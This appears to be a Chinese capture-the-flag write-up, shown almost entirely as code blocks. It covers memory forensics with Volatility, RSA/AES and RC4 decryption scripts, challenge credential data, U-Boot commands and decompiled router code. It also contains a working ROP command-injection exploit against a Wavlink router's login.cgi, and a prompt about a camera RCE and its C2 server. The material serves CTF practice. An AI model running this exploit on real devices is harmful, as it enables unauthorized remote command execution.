```20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334d919c229aab6535efa09a52c589c8f475b204675b1b173c32c04b0b8a100ee29```
```



```
```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 filescan | grep -i rsa```
```



```
```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x00000000061f5630 -D .mv file.None.0xfffffa800f08b510.dat private.pem
volatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003dfdf070 -D .mv file.None.0xfffffa800cee0ad0.dat hack.py
volatility -f easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003fd5bf20 -D .mv file.None.0xfffffa800da29f10.dat encrypted_data.zip```
```



```
```-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAkneyJiNWRK/CYoSUOVpEqARdZF7XYkeIl83CQXumaerjoqshfZezq6oLiaKBj3ljmR2HzwYAEBDVQCc4QE7ZcLfQ11ra8/l8K451ax0hGI4bnPoPiS7ticYCO9U5PygwxF4OK6sscf8rD1XauVzY/i32sytvSeh4uWWWJFS55klI4AmALeBa2+KcOiXIJoSmeU5JRKq+u6JKJheCli6FY/ouEsgpI0vIdNBnpFQLNX7xo/KhJoysBN/pV0baJ7CY/9mZfdLo+O99NWHkfoGouaWMzgy8xPrXyHI8Tw3E8mm1k2q2jzYrfoTBrfAlHNNvD3ucIvJXdpl0vg/FoTgcMQIDAQABAoIBAB7XQOYqcS8f4jq753knIodNefvZQ5mQbfjnDNUcjAdH/DxDtBbdw2mtceX+l7DmEtyKHQ9w2EEJxlmOmJfj8oG7VuiN20ZdvXFvexZ9qPsiazqT5gMRJFfrH4vJQ1di51fl5S55Se/MFt1RCvAWlqN4+rYx+mpR3t/M/f8y7v0IFlbC9fh6C6Qb7NQIvZUiqP0bzolCQQUEjrX77/qTfiozUDttuBJtdyuRnYc1jx43Pw4hsH76Fdgp/BRbq8ejbW88CyQUSKrPgEf7X7JIms1+RiAytaKdq4ovk8H27fd6XIMLLL7Un8cpBWZ/5CrrMgsTMoxub2gYfisyPM/N2kUCgYEAvl2/CGRq7Gx4aNgsXGB9bQznQfK2W6ptMypRm+3GiJYcbO9qYS1XeRd+PA3oN3dv9ynVsmuC2gOYHcx40LTc2uv7l6BVA5XF34iXihMKBjj1FMBdncrDYIfmBjsJAsQPFh7Jf6DxiFUTtFZbGaxvp1cGvUKI/Ooggqn3kzZMtz0CgYEAxPdVT7Qy60Re2m+OmhC89R0LeMb29w2ihwuHiHSOd5vNTQgnIAGJ7VlwQh8Ac7/eqDuvJR6GtGqDtxLzeGt9r/nNqoZHrj4ZW92KLVjZst9HnuxPIuK5sP63k00Xk0DUU8meMwVgObP+cno8HMh8lWjglcYVT6Y/EhgYESLjKAUCgYEAohMEkuuT0Shkt7bcxeVsxAyJU6+GLLMD99ze0Gf3cNCE8QZBRu0onTMwSYb5n0ez7vYSN66rIFyRBUXR0rc5lbX2ZVifKMc6SZ9sjaS6EyQpHPrOeYppH2V0pPdcK5uq0IVzvpLTMORmO1KOi2QxR4KjfT0JjnLzLOvymcZQOG0CgYAT/THYO+Zq/+5MZsPnGMnEamUupaqMmgKjh+UCUSngM5ybM7ecxOs1fj0pSLIoDRHQqvX0Y2uyRZkGbFLvJqGDyWs44hXGNiEmtI4AWiMFxykilMLXPIEx2DfTKCC7XfnuYui+Ls58LKsm/Qa6uRIDq7gXGxowkiOWd4GBw7Of7QKBgQCCQG+iNPF06zn94Iasqz0ELv/iLUoIM2WSTmVIIjlCpP3khJssaCQk4wyx+0G+CoOILbDnl+mtNWRR+a09LCNjyedEl+7zsxZUCmFH4jljBoXAspw31MwmNXeRkCLNVmoZYAEuJ47SGV5ImKx05fJGV3d8M557pzYsKOzhyMhYMg==-----END RSA PRIVATE KEY-----```
```



```
```pythonimport osimport hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSA
hackkey = os.getenv('hackkey')if not hackkey: raise ValueError("Environment variable 'hackkey' is not set")
with open('private.pem', 'r') as f: private_key = RSA.import_key(f.read())public_key = private_key.publickey().export_key()
aes_key = hashlib.sha256(hackkey.encode()).digest()
with open('data.csv', 'rb') as f: data = f.read()
cipher_aes = AES.new(aes_key, AES.MODE_EAX)ciphertext, tag = cipher_aes.encrypt_and_digest(data)cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))enc_aes_key = cipher_rsa.encrypt(aes_key)
with open('encrypted_data.bin', 'wb') as f: f.write(ciphertext) print(enc_aes_key.hex())print(cipher_aes.nonce.hex())print(tag.hex())```
```



```
```bashvolatility -f easyrawencode.raw --profile=Win7SP1x64 envars | grep -i hackkey```
```



```
```pythonprint(enc_aes_key.hex())print(cipher_aes.nonce.hex())print(tag.hex())```
```



```
```pythonimport osimport hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSA
hackkey = '4etz0hHbU3TgKqduFL'
with open('private.pem', 'rb') as f: private_key = RSA.import_key(f.read())
with open('encrypted_data.bin', 'rb') as f: ciphertext = f.read()
enc_aes_key = bytes.fromhex('20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334')nonce = bytes.fromhex('d919c229aab6535efa09a52c589c8f47')tag = bytes.fromhex('5b204675b1b173c32c04b0b8a100ee29')
cipher_rsa = PKCS1_OAEP.new(private_key)aes_key = cipher_rsa.decrypt(enc_aes_key)
derived_aes_key = hashlib.sha256(hackkey.encode()).digest()if aes_key != derived_aes_key: raise ValueError("Decryption failed: AES key mismatch")
cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)data = cipher_aes.decrypt_and_verify(ciphertext, tag)
with open('data.csv', 'wb') as f: f.write(data)
```
```



```
```编号,用户名,密码,姓名,性别,出生日期,个性签名(加密版)1,sWEbvrLvgyFO9u8,vHBhvVXS2JvLnTTo,胜屠翰池,男,19761023,korvy4fjEBP6AKeDValKDfzBRK9sKDSIHVakq3NXMMU32,wangguizhi,3E8vleDJFC,桓玉珂,女,20050814,NF+z3NevQqWILNqNvUznlOFie3KLuhIztQNLFnRy3,kofxlSO1C3XEXP3QPH1lEg5WQ,4U86p3uzw7xV,崎邱炜,男,20000710,yutW+1ipTbce3pcz+BEIBS48fX7NF5hh8bWEdigYsHca3vo/dQ0Nl+YFmpl5UD4Onga0hGehitNvMrG4XNFdH+lHEg==```
```



```
```pythonimport pandas as pdfrom Crypto.Cipher import ARC4import base64
def decrypt_rc4(ciphertext, key): cipher = ARC4.new(key.encode()) decrypted_data = cipher.decrypt(base64.b64decode(ciphertext)) return decrypted_data.decode('utf-8')
df = pd.read_csv('data.csv')df['个性签名(解密版)'] = df.apply(lambda row: decrypt_rc4(row['个性签名(加密版)'], row['密码']), axis=1)df.to_csv('data_decode.csv', index=False)
```
```



```
```qemu-system-x86_64 -cpu qemu64-v1 -bios u-boot.rom -drive file=./uboot.disk,format=raw,if=ide -nographic```
```



```
```load ide 0:2 0x0000000 flagmd 0```
```



```
```cint check_csrf_referer(){const char *v0; // $s5const char *v1; // $s7int v2; // $v0const char *v3; // $s2const char *v4; // $s6char *v5; // $s1char *v6; // $s4const char *v7; // $fpint result; // $v0 FILE *v9; // $s0 FILE *v10; // $s0bool v11; // dc
 v0 = (const char *)nvram_bufget(0, "SYS_DOMAIN1"); v1 = (const char *)nvram_bufget(0, "SYS_DOMAIN2"); v3 = (const char *)nvram_bufget(0, "lan_ipaddr"); v2 = get_wanif_name(); v4 = (const char *)get_ipaddr(v2); v5 = getenv("HTTP_REFERER"); v6 = getenv("HTTP_HOST"); v7 = (const char *)nvram_bufget(0, "MeshMode");if ( !access("/tmp/web_log", 0) ) { v10 = fopen("/dev/console", "w+");if ( v10 ) {fprintf(v10, "%s:%s:%d:http_host-- %snn", "utils.c", "check_csrf_referer", 2101, v6); fclose(v10); } }if ( !access("/tmp/web_log", 0) ) { v9 = fopen("/dev/console", "w+");if ( v9 ) {fprintf( v9,"%s:%s:%d:http_refer-- %s ipv4_lan== %s ipv4_wan== %s domain1== %s domain2== %snn","utils.c","check_csrf_referer",2102, v5, v3, v4, v0, v1); fclose(v9); } }if ( !v5 )return -1;if ( strstr(v5, v3) )return 0; v11 = strstr(v5, v0) != 0; result = 0;if ( !v11 ) { v11 = strstr(v5, v1) != 0; result = 0;if ( !v11 ) { v11 = strstr(v5, v4) != 0; result = 0;if ( !v11 ) { v11 = strcmp(v7, "2") != 0; result = -1;if ( !v11 ) { v11 = strstr(v6, v3) != 0; result = 0;if ( !v11 ) { v11 = strstr(v6, v0) != 0; result = 0;if ( !v11 ) { v11 = strstr(v6, v1) != 0; result = 0;if ( !v11 ) {if ( strstr(v6, v4) )return 0;return -1; } } } } } } }return result;}
```
```



```
```pythonimport requestsfrom pwn import *import sys#context.log_level="debug"
libwebutil_base=0x77e1e000
if len(sys.argv)!=3: print("Usage: python %s ip "command""%sys.argv[0]) exit(0)
ip= sys.argv[1]cmd= sys.argv[2]
'''.text:00007970 28 00 BC 8F lw $gp, 0x28($sp).text:00007974 00 00 00 00 nop.text:00007978 C8 80 99 8F la $t9, do_system.text:0000797C 00 00 00 00 nop.text:00007980 09 F8 20 03 jalr $t9 ; do_system.text:00007984 move $a0, $s0'''
fmt=libwebutil_base+0x578b8 #"%s"#fmt=libwebutil_base+0x578d0rop=libwebutil_base+0x7970gp=libwebutil_base+0x5d550 #fix $gp
cmd=b"a;"+cmd.encode()+b";x00"
#payload=b"page=Goto_chidx&wlanUrl="#payload+=b"a"*(140-12)payload=b"a"*(128)#payload+=b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"payload+=p32(fmt)+b"b"*8payload+=p32(rop)+b"c"*40+p32(gp)+cmd
Head = {'Referer': 'wifi.wavlink.com'}url = "http://%s/cgi-bin/login.cgi"%ipData = {"page":"Goto_chidx","wlanUrl":payload}
response = requests.post(url,headers=Head,data=Data)
print(response.text)print(response)
#python exp.py 127.0.0.1 'echo `cat /flag` >> /etc_ro/lighttpd/www/login.shtml'

```
```



```
```python exp.py 127.0.0.1 'echo `cat /flag` >> /etc_ro/lighttpd/www/login.shtml'```
```



```
```小李的摄像头被黑客入侵了，但只捕获到了单向的流量包，请分析摄像头固件与对应的流量，回答以下问题：攻击者利用摄像头哪个接口实现的RCE？攻击者回连的C2服务器ip地址是什么？
flag格式：flag{接口名称_ip地址} 例：flag{qweasd_127.0.0.1}```
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1737601182.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1737601184.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1737601186.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1737601187.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1737601187.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1737601188.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1737601189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1737601190.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/2-1737601190.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1737601191.png)